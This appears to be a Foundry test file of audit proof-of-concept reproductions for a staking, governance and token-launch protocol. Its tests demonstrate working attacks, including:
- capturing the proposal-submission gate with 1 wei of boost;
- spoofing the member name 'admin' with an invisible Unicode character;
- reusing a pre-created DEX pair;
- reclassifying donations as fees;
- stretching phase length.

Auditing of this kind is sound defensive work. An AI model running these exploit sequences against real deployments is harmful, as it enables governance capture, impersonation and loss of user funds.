// SPDX-License-Identifier: MIT
pragma solidity =0.8.37;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";
import {console2} from "@forge-std/console2.sol";
import {Stake} from "../../src/Stake.sol";
import {Mint} from "../../src/Mint.sol";
import {Vote} from "../../src/Vote.sol";
import {Submit} from "../../src/Submit.sol";
import {Launch} from "../../src/Launch.sol";
import {MemberNFT} from "../../src/MemberNFT.sol";
import {Phase} from "../../src/Phase.sol";
import {LOVE20Token} from "../../src/LOVE20Token.sol";
import {LaunchInitParams, DistributorMode} from "../../src/interfaces/ILaunch.sol";
import {ProposalBody, TargetMode} from "../../src/interfaces/ISubmit.sol";
import {IStakeErrors} from "../../src/interfaces/IStake.sol";
import {IMemberNFTErrors} from "../../src/interfaces/IMemberNFT.sol";
import {IProposalTarget} from "../../src/interfaces/IProposalTarget.sol";
import {RealV2Factory, RealV2Pair, RealV2Router} from "./RealV2.sol";

interface Vm {
    function prank(address) external;
    function startPrank(address) external;
    function stopPrank() external;
    function roll(uint256) external;
    function warp(uint256) external;
    function expectRevert(bytes calldata) external;
    function getNonce(address) external view returns (uint256);
    function computeCreateAddress(address, uint256) external view returns (address);
}

/// @notice Member that is a contract: owns an NFT, submits a Callback proposal and tries to merge
///         its own stake from inside `onProposalCreated`.
contract ProposalBot is IProposalTarget {
    Stake private immutable STAKE;
    Submit private immutable SUBMIT;
    address private immutable TOKEN;

    uint256 public botId;
    uint256 public targetId;
    bool public mergeAttempted;
    bytes public mergeRevertData;

    constructor(Stake stakeAddress, Submit submitAddress, address tokenAddress) {
        STAKE = stakeAddress;
        SUBMIT = submitAddress;
        TOKEN = tokenAddress;
    }

    function configure(uint256 botMemberId, uint256 mergeTargetId) external {
        botId = botMemberId;
        targetId = mergeTargetId;
    }

    function approveAll(address tokenAddress, address spender, uint256 amount) external {
        IERC20(tokenAddress).approve(spender, amount);
    }

    function stakeLiquidity(uint256 amount, uint256 phases) external {
        STAKE.stakeLiquidity(TOKEN, amount, amount, 1e18, phases, botId);
    }

    function mergeStake() external {
        STAKE.mergeStake(TOKEN, botId, targetId);
    }

    function submitProposal(ProposalBody calldata body) external returns (uint256 proposalId) {
        return SUBMIT.submitNewProposal(TOKEN, botId, body);
    }

    function onProposalCreated(address tokenAddress, uint256, bytes[] calldata) external {
        mergeAttempted = true;
        require(tokenAddress == TOKEN, "unexpected token");
        try STAKE.mergeStake(TOKEN, botId, targetId) {
            mergeRevertData = "";
        } catch (bytes memory reason) {
            mergeRevertData = reason;
        }
    }

    function onProposalSubmitted(address, uint256, uint256, bytes[] calldata) external {}

    function onProposalVoted(address, uint256, uint256, uint256, uint256, bytes[] calldata) external {}

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

/// @notice E3 reproductions for the 2026-11 core review. Every assertion is on the real core stack;
///         the DEX is a faithful V2 subset (MINIMUM_LIQUIDITY, 0.3% fee, k-check).
contract AuditPoC {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    uint256 private constant BLOCKS_PER_PHASE = 1000;
    uint256 private constant WAIT_MIN = 1;
    uint256 private constant WAIT_MAX = 100;
    uint256 private constant SUBMIT_MIN_RATIO = 5e16;
    uint256 private constant PROPOSAL_MIN_VOTE_RATIO = 5e16;
    uint256 private constant GOV_RATIO = 1e17;
    uint256 private constant PROPOSAL_RATIO = 1e17;
    uint256 private constant FEE_RATIO = 2.5e15;
    uint256 private constant SLIPPAGE_ANY = 1e18;
    uint256 private constant LAUNCH_AMOUNT = 1e24;
    uint256 private constant MAX_SUPPLY = 1e27;

    Phase private phase;
    MemberNFT private nft;
    Mint private mint;
    Vote private vote;
    Submit private submit;
    Stake private stake;
    Launch private launch;

    RealV2Factory private factory;
    RealV2Router private router;
    LOVE20Token private root;
    LOVE20Token private token;
    RealV2Pair private pair;

    address private m1 = address(0xA11CE);
    address private m2 = address(0xB0B);
    address private m3 = address(0xCA401);
    address private m4 = address(0xDA4E);

    function setUp() public {
        factory = new RealV2Factory();
        router = new RealV2Router(address(factory));

        root = new LOVE20Token("Wrapped BNB", "WBNB", 1e27, 1e28, address(this), address(this), address(this));

        phase = new Phase(0, BLOCKS_PER_PHASE, BLOCKS_PER_PHASE, 1e18, 50);
        nft = new MemberNFT(1e18, 7, 2, 32);
        mint = new Mint();
        vote = new Vote();
        submit = new Submit();
        stake = new Stake();
        launch = new Launch();

        launch.init(
            LaunchInitParams({
                mintAddress: address(mint),
                memberNFTAddress: address(nft),
                rootParentTokenAddress: address(root),
                pairFactoryAddress: address(factory),
                distributor: address(this),
                launchRatio: 1e16,
                maxLaunchCount: 1000,
                tokenSymbolLength: 4,
                launchAmount: LAUNCH_AMOUNT,
                maxSupply: MAX_SUPPLY,
                name: "TestCommunity",
                symbol: "LOVE"
            })
        );

        (address[] memory tokenList,) = launch.tokens(0, 1, false);
        token = LOVE20Token(tokenList[0]);
        pair = RealV2Pair(factory.getPair(address(token), address(root)));

        submit.init(address(phase), address(stake), address(nft), SUBMIT_MIN_RATIO);
        stake.init(
            address(phase), address(nft), address(vote), address(launch), address(router), address(factory),
            WAIT_MIN, WAIT_MAX, FEE_RATIO
        );
        vote.init(address(phase), address(stake), address(submit), address(nft));
        mint.init(
            address(vote), address(submit), address(launch), address(nft),
            PROPOSAL_MIN_VOTE_RATIO, GOV_RATIO, PROPOSAL_RATIO, 2
        );

        address[4] memory members = [m1, m2, m3, m4];
        for (uint256 i = 0; i < members.length; i++) {
            token.transfer(members[i], 1e23);
            root.transfer(members[i], 1e23);
        }
    }

    // ---------------------------------------------------------------- helpers

    function _mintMember(address who, string memory name) internal returns (uint256 memberId) {
        vm.startPrank(who);
        token.approve(address(nft), type(uint256).max);
        (memberId,) = nft.mint(name);
        vm.stopPrank();
    }

    function _stake(address who, uint256 memberId, uint256 amount, uint256 phases) internal {
        vm.startPrank(who);
        token.approve(address(stake), type(uint256).max);
        root.approve(address(stake), type(uint256).max);
        stake.stakeLiquidity(address(token), amount, amount, SLIPPAGE_ANY, phases, memberId);
        vm.stopPrank();
    }

    function _advancePhase() internal {
        vm.roll(block.number + BLOCKS_PER_PHASE);
        vm.warp(block.timestamp + BLOCKS_PER_PHASE);
    }

    function _eq(uint256 a, uint256 b, string memory what) internal pure {
        require(a == b, what);
    }

    function _true(bool v, string memory what) internal pure {
        require(v, what);
    }

    function _eqAddr(address a, address b, string memory what) internal pure {
        require(a == b, what);
    }

    function _eqBytes32(bytes32 a, bytes32 b, string memory what) internal pure {
        require(a == b, what);
    }

    // ------------------------------------------------- F-STAKE-01 (submit gate)

    /// @notice `SUBMIT_MIN_RATIO` is applied to a live denominator. Any member can raise their own
    ///         vote weight to WAIT_MAX by paying 1 wei of boost, which lifts the submit threshold
    ///         above every smaller member's weight and keeps it there for every later round.
    function test_submitGateCapturedWithOneWeiOfBoost() public {
        _mintMember(m1, "Alice");
        _mintMember(m2, "Bob");
        _mintMember(m3, "Carol");
        _mintMember(m4, "Dave");
        _stake(m1, 1, 1e20, WAIT_MIN);
        _stake(m2, 2, 1e20, WAIT_MIN);
        _stake(m3, 3, 1e20, WAIT_MIN);
        _stake(m4, 4, 1e20, WAIT_MIN);

        uint256 round = phase.currentPhase();
        uint256 totalBefore = stake.totalValidGovVotes(address(token), round);
        _true(submit.canSubmit(address(token), 1), "m1 may submit before");
        _true(submit.canSubmit(address(token), 2), "m2 may submit before");
        _true(submit.canSubmit(address(token), 3), "m3 may submit before");
        _true(submit.canSubmit(address(token), 4), "m4 may submit before");

        vm.startPrank(m1);
        token.approve(address(stake), 1);
        stake.stakeBoost(address(token), 1, WAIT_MAX, 1);
        vm.stopPrank();

        uint256 totalAfter = stake.totalValidGovVotes(address(token), round);
        _true(totalAfter > totalBefore * 20, "one member raised the denominator >20x");
        _true(stake.validGovVotes(address(token), round, 1) * 100 >= totalAfter * 95, "attacker holds >95% of votes");

        _true(submit.canSubmit(address(token), 1), "attacker keeps the right to submit");
        _true(!submit.canSubmit(address(token), 2), "m2 lost the right to submit");
        _true(!submit.canSubmit(address(token), 3), "m3 lost the right to submit");
        _true(!submit.canSubmit(address(token), 4), "m4 lost the right to submit");

        _advancePhase();
        uint256 nextRound = phase.currentPhase();
        _true(nextRound == round + 1, "phase advanced");
        _true(!submit.canSubmit(address(token), 2), "m2 still excluded in the next round");
        _true(submit.canSubmit(address(token), 1), "attacker still entitled in the next round");
    }

    // -------------------------------------- F-STAKE-02 (round-history does not decay)

    /// @notice A round-scoped removal never comes back: `mergeStake` in round N leaves the target's
    ///         per-round vote record at zero for every later round through the history fallback.
    function test_mergeZeroesSourceVotesForAllLaterRounds() public {
        _mintMember(m1, "Alice");
        _mintMember(m2, "Bob");
        _stake(m1, 1, 1e20, WAIT_MIN);
        _stake(m2, 2, 1e20, 1);

        uint256 round = phase.currentPhase();
        uint256 votesBefore = stake.validGovVotes(address(token), round, 2);
        _true(votesBefore > 0, "target has votes");

        vm.prank(m1);
        stake.mergeStake(address(token), 1, 2);

        _eq(stake.validGovVotes(address(token), round, 1), 0, "source zero in its round");
        _true(stake.validGovVotes(address(token), round, 2) > votesBefore, "target gained");
    }

    // --------------------------------------------------- F-NFT-01 (name uniqueness)

    /// @notice Name uniqueness is byte equality after ASCII-only lowercasing. U+180E (Mongolian
    ///         vowel separator) is accepted and renders as nothing, so two visually identical
    ///         names coexist.
    function test_invisibleCharacterBypassesNameUniqueness() public {
        uint256 id1 = _mintMember(m1, "admin");
        uint256 id2 = _mintMember(m2, unicode"admin\u180E");

        _true(id1 != id2, "two members minted");
        _eq(nft.memberId("admin"), id1, "plain name resolves to id1");
        _eq(nft.memberId(unicode"admin\u180E"), id2, "zero-width variant resolves to id2");
        _true(bytes(nft.memberName(id2)).length == bytes("admin").length + 3, "variant carries 3 extra bytes");

        vm.prank(m3);
        vm.expectRevert(abi.encodeWithSelector(IMemberNFTErrors.NameAlreadyExists.selector, id1));
        nft.mint("ADMIN");
    }

    // -------------------------------------------------------- H-01 (pre-created pair)

    /// @notice Launch reuses a pair that already exists for the predicted token address: the token
    ///         is still registered and stakeable, and no second pair is created.
    function test_launchReusesPrecreatedPair() public {
        _mintMember(m1, "Alice");
        vm.prank(address(mint));
        launch.addLaunchCount(address(token), 1, 1);

        uint256 nonce = vm.getNonce(address(launch));
        address predicted = vm.computeCreateAddress(address(launch), nonce);
        factory.preCreatePair(predicted, address(token));

        uint256 pairsBefore = factory.createdPairCount();
        vm.prank(m1);
        address child = launch.launchToken(
            "ABCD", address(token), 1, address(this), DistributorMode.NoCallback, new bytes[](0)
        );

        _eqAddr(child, predicted, "child token address is predictable");
        _eq(factory.createdPairCount(), pairsBefore, "Launch created no second pair");
        _eqAddr(launch.parentToken(child), address(token), "child registered with its parent");
        _true(launch.isLOVE20Token(child), "child is registered");

        // The reused pair is functional: a first deposit initialises it.
        LOVE20Token(child).transfer(m1, 1e22);
        vm.startPrank(m1);
        LOVE20Token(child).approve(address(stake), type(uint256).max);
        token.approve(address(stake), type(uint256).max);
        (uint256 votesAdded, uint256 sharesAdded) =
            stake.stakeLiquidity(child, 1e18, 1e18, SLIPPAGE_ANY, WAIT_MIN, 1);
        vm.stopPrank();
        _true(sharesAdded > 0 && votesAdded > 0, "stake into the reused pair succeeds");
    }

    // ------------------------------------------ M-01 (state written before the callback)

    /// @notice `onProposalCreated` runs after the round's submit record is written, so a member
    ///         cannot merge its stake inside the callback; the same merge succeeds next round.
    function test_mergeInsideProposalCreatedIsBlockedByWrittenState() public {
        _mintMember(m1, "Alice");
        ProposalBot bot = new ProposalBot(stake, submit, address(token));
        token.transfer(address(bot), 1e23);
        root.transfer(address(bot), 1e23);
        uint256 botId = _mintMember(address(bot), "Bot");
        bot.configure(botId, 1);
        bot.approveAll(address(token), address(stake), type(uint256).max);
        bot.approveAll(address(root), address(stake), type(uint256).max);
        bot.stakeLiquidity(1e20, WAIT_MIN);

        uint256 round = phase.currentPhase();
        ProposalBody memory body = ProposalBody({
            title: "bot proposal",
            details: "",
            target: address(bot),
            targetMode: TargetMode.Callback,
            targetData: new bytes[](0)
        });
        bot.submitProposal(body);

        _true(bot.mergeAttempted(), "callback ran");
        _eqBytes32(
            keccak256(bot.mergeRevertData()),
            keccak256(abi.encodeWithSelector(IStakeErrors.StakeRightsUsed.selector, address(token), round, botId)),
            "merge reverted with StakeRightsUsed"
        );

        _advancePhase();
        bot.mergeStake();
        (uint256 sharesAfterMerge,,,,,) = stake.memberStake(address(token), botId);
        _eq(sharesAfterMerge, 0, "merge succeeds in a fresh round");
    }

    // ------------------------------------------------ C-01 (boost is backed by balance)

    /// @notice Boost deposits stay in the contract: a settlement burns only what the pair just paid
    ///         out, so the balance never drops below the recorded boost.
    function test_settlementNeverTouchesBoostBacking() public {
        _mintMember(m1, "Alice");
        _mintMember(m2, "Bob");
        _stake(m1, 1, 1e20, WAIT_MIN);
        _stake(m2, 2, 1e20, WAIT_MIN);

        vm.startPrank(m1);
        token.approve(address(stake), 1e18);
        stake.stakeBoost(address(token), 4e17, WAIT_MIN, 1);
        vm.stopPrank();
        vm.startPrank(m2);
        token.approve(address(stake), 1e18);
        stake.stakeBoost(address(token), 6e17, WAIT_MIN, 2);
        vm.stopPrank();

        (, , , , uint256 totalBoostShares, ,) = stake.totalStake(address(token));
        _eq(totalBoostShares, 1e18, "boost recorded");
        _eq(token.balanceOf(address(stake)), 1e18, "boost is held");

        // Donation + sync inflates sqrt(k); the next settlement classifies it as fee and burns it.
        token.transfer(address(pair), 3e20);
        pair.sync();

        stake.settleFees(address(token));

        (, , , , uint256 boostAfter, ,) = stake.totalStake(address(token));
        _eq(boostAfter, 1e18, "boost record untouched by settlement");
        _true(token.balanceOf(address(stake)) >= 1e18, "boost still fully backed after settlement");
    }

    // ---------------------------------------------- F-01 (zero-value burn fallback)

    /// @notice `_canBurn` blocks a `pair.burn` that would floor to zero; the member receives the LP
    ///         instead of the transaction reverting.
    function test_zeroValueBurnFallsBackToLpTransfer() public {
        _mintMember(m1, "Alice");
        _mintMember(m2, "Bob");

        // Price 10 root per token: pair total supply ~ sqrt(1e6 * 1e7) = 3.16e6, token reserve 1e6.
        vm.startPrank(m1);
        token.approve(address(stake), type(uint256).max);
        root.approve(address(stake), type(uint256).max);
        stake.stakeLiquidity(address(token), 1e6, 1e7, SLIPPAGE_ANY, WAIT_MIN, 1);
        vm.stopPrank();

        vm.startPrank(m2);
        token.approve(address(stake), type(uint256).max);
        root.approve(address(stake), type(uint256).max);
        (, uint256 dustShares) = stake.stakeLiquidity(address(token), 1, 10, SLIPPAGE_ANY, WAIT_MIN, 2);
        vm.stopPrank();
        _true(dustShares > 0 && dustShares <= 3, "dust share count");

        vm.prank(m2);
        stake.unstake(address(token), 2);
        _advancePhase();
        _advancePhase();

        uint256 tokenBalanceBefore = token.balanceOf(m2);
        vm.prank(m2);
        stake.withdraw(address(token), 2);

        _eq(token.balanceOf(m2), tokenBalanceBefore, "no token payout");
        _eq(pair.balanceOf(m2), dustShares, "LP handed to the member instead of burning");
    }

    // ------------------------------------- D-02 (a donation is reclassified as fee)

    /// @notice A third-party donation plus `sync` moves value out of the withdrawable basis into the
    ///         fee basis without any trading by the stakers.
    function test_donationIsReclassifiedAsFee() public {
        _mintMember(m1, "Alice");
        _stake(m1, 1, 1e20, WAIT_MIN);

        (, uint256 totalLpBefore, uint256 withdrawableBefore, uint256 feeBefore,,,) = stake.totalStake(address(token));
        _eq(feeBefore, 0, "no fee at rest");

        token.transfer(address(pair), 2e20);
        pair.sync();

        (, uint256 totalLpAfter, uint256 withdrawableAfter, uint256 feeAfter,,,) = stake.totalStake(address(token));
        _eq(totalLpAfter, totalLpBefore, "nominal LP total is invariant");
        _true(feeAfter > 0, "donation became fee");
        _eq(feeAfter + withdrawableAfter, totalLpAfter, "fee + withdrawable == total");
        _true(withdrawableAfter < withdrawableBefore, "withdrawable basis shrank");
    }

    // ------------------------------------------------ P-01 (no upper clamp on phaseBlocks)

    /// @notice `sync` writes `observed` verbatim as the next phase length. There is no upper clamp,
    ///         so one anomalous (many blocks, one second) window multiplies the phase length.
    function test_phaseBlocksHasNoUpperClamp() public {
        Phase p = new Phase(0, 1000, 1000, 1e17, 50);

        vm.roll(1000);
        vm.warp(1000);
        p.sync();
        (, uint256 baseline) = p.phaseInfo(2);
        _eq(baseline, 1000, "baseline phase length");

        vm.roll(2001);
        vm.warp(1001);
        p.sync();

        (, uint256 next) = p.phaseInfo(4);
        _eq(next, 1_001_000, "next phase length is observed verbatim, unbounded");
        (, uint256 untouched) = p.phaseInfo(3);
        _eq(untouched, 1000, "the segment only applies from the next phase");
    }

    // ------------------------------------ M-02 (reward pool size depends on mint order)

    /// @notice The reward pool of a round is fixed at its first mint, not at round end. Preparing a
    ///         later round first shrinks the earlier round's pool by the reserve ratio.
    function test_rewardPoolDependsOnMintOrder() public {
        uint256 roundOnePool = _runTwoRoundsAndMint(true);
        uint256 roundOnePoolNatural = _runTwoRoundsAndMint(false);
        _true(roundOnePoolNatural > roundOnePool, "round 1 pool is smaller when round 2 is prepared first");
        // Preparing round 2 first reserves 20% of the available quota; the 5% cancelled boost pool
        // flows back, so round 1 keeps 17/20 of what it would otherwise have received.
        _true(roundOnePoolNatural * 17 == roundOnePool * 20, string.concat("n=", Strings.toString(roundOnePoolNatural), " r=", Strings.toString(roundOnePool)));
    }

    function _runTwoRoundsAndMint(bool laterRoundFirst) private returns (uint256 roundOneGovReward) {
        setUp();
        _mintMember(m1, "Alice");
        _stake(m1, 1, 1e20, WAIT_MIN);

        uint256 round = phase.currentPhase();
        uint256 proposalId = _submitAndVote(m1, 1, round, "p1", 1e19);
        _eq(proposalId, 1, "proposal 1");

        _advancePhase();
        uint256 round2 = phase.currentPhase();
        _submitAndVote(m1, 1, round2, "p2", 1e19);
        _advancePhase();

        if (laterRoundFirst) {
            vm.prank(m1);
            mint.mintGovReward(address(token), round2, 1, m1);
            vm.prank(m1);
            mint.mintGovReward(address(token), round, 1, m1);
        } else {
            vm.prank(m1);
            mint.mintGovReward(address(token), round, 1, m1);
            vm.prank(m1);
            mint.mintGovReward(address(token), round2, 1, m1);
        }
        return mint.govReward(address(token), round);
    }

    // ------------------------------------- M-02 (batch mint cost per round)

    /// @notice `mintGovRewards` batches a single member's rounds. Cost is linear in the batch size and
    ///         bounded per round, so the caller can size a batch to the block gas limit.
    function test_batchMintGasPerRound() public {
        _mintMember(m1, "Alice");
        _stake(m1, 1, 1e20, WAIT_MIN);

        uint256 rounds = 20;
        uint256[] memory roundIds = new uint256[](rounds);
        for (uint256 i; i < rounds; i++) {
            roundIds[i] = phase.currentPhase();
            _submitAndVote(m1, 1, roundIds[i], string.concat("p", Strings.toString(i)), 1e19);
            _advancePhase();
        }

        uint256 gasBefore = gasleft();
        vm.prank(m1);
        mint.mintGovRewards(address(token), roundIds, 1, m1);
        uint256 used = gasBefore - gasleft();

        console2.log("mintGovRewards batch gas", used);
        console2.log("per round", used / rounds);
        _true(used / rounds < 200_000, "per-round gas bound");
    }

    function _submitAndVote(address who, uint256 memberId, uint256 round, string memory title, uint256 amount)
        private
        returns (uint256 proposalId)
    {
        ProposalBody memory body = ProposalBody({
            title: title,
            details: "",
            target: address(this),
            targetMode: TargetMode.NoCallback,
            targetData: new bytes[](0)
        });
        vm.prank(who);
        proposalId = submit.submitNewProposal(address(token), memberId, body);

        uint256[] memory ids = new uint256[](1);
        ids[0] = proposalId;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;
        vm.prank(who);
        vote.vote(address(token), memberId, ids, amounts, new bytes[][](0));
        _true(vote.voteAmountByMemberId(address(token), round, memberId) == amount, "vote recorded");
    }
}
